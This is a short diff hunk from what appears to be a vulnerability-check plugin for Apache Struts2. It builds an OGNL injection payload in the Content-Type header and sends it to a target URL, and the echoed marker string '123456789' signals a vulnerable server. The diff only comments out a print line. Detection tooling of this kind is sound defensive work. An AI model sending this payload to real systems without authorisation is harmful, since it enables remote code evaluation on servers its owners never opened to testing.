@@ -27,7 +27,7 @@ class P(T):
         result['result']=False
         res=None
         payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('123456789')).(#o.close())}"
-        print target_url
+        # print target_url
         try:
             headers = {"Content-Type":payload}
             r = requests.get(target_url,headers=headers,timeout=5)
